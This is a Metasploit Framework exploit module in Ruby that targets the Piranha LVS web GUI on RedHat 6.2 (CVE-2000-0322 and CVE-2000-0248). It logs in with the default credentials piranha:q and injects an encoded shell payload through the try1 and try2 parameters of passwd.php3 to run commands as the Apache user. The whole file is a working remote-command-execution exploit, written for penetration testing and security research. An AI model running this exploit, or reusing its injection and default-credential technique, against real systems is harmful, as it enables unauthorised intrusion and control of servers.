##
# $Id: piranha_passwd_exec.rb 10729 2010-10-18 15:41:13Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	HttpFingerprint = { :pattern => [ /Apache/ ] }

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'RedHat Piranha Virtual Server Package passwd.php3 Arbitrary Command Execution',
			'Description'    => %q{
				This module abuses two flaws - a metacharacter injection vulnerability in the
				HTTP management server of RedHat 6.2 systems running the Piranha
				LVS cluster service and GUI (rpm packages: piranha and piranha-gui).
				The vulnerability allows an authenticated attacker to execute arbitrary
				commands as the Apache user account (nobody) within the
				/piranha/secure/passwd.php3 script. The package installs with a default
				user and password of piranha:q which was exploited in the wild.
			},
			'Author'         => [ 'patrick' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10729 $',
			'References'     =>
				[
					# Default password
					[ 'CVE', '2000-0248' ],
					[ 'OSVDB', '289' ],
					[ 'BID', '1148' ],
					# Command Execution
					[ 'CVE', '2000-0322' ],
					[ 'OSVDB', '1300' ],
					[ 'BID', '1149' ]
				],
			'Platform'       => ['unix'],
			'Arch'           => ARCH_CMD,
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'       => 1024,
					'DisableNops' => true,
					'BadChars'    => "\x22\x27", # magic_quotes_gpc
					# NOTE: We specify our own custom-ish encoder here.
					# This is due to lots of incompatabilities with the old RedHat 6.2 test system.
					# 1. inetd exists, but the syntax is no good.
					# 2. telnet exists
					# 3. /dev/tcp doesn't work.
					# 4. PHP's magic_quotes_gpc is on by default, causing escaping of single/double quotes.
					# 5. echo -ne doesn't work
					'EncoderType' => Msf::Encoder::Type::PrintfPHPMagicQuotes,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl'
						}
				},
			'Targets'        =>
				[
					[ 'Automatic (piranha-gui-0.4.12-1.i386.rpm)', { } ]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Apr 04 2000'))

		register_options(
			[
				OptString.new('BasicAuthUser', [true, 'The HTTP username to specify for basic authentication', 'piranha']),
				OptString.new('BasicAuthPass', [true, 'The HTTP password to specify for basic authentication', 'q']),
			], self.class)
	end

	def exploit
		cmd = Rex::Text.uri_encode(payload.encoded, 'hex-normal')
		str = "/piranha/secure/passwd.php3?try1=q+;#{cmd}&try2=q+;#{cmd}&passwd=ACCEPT"
		print_status("Sending GET request with encoded command line...")
		res = send_request_raw({
				'uri' => str,
				'method' => 'GET',
				'headers' =>
					{
						'content-type' => 'application/x-www-form-urlencoded',
					},
			}, 3)

		if (res.code == 401)
			print_error("401 Authorization Required! Our BasicAuthUser and BasicAuthPass credentials not accepted!")
		elsif (res.code == 200 and res.body =~ /The passwords you supplied match/)
			print_status("Command successfully executed (according to the server).")
		end
	end

end
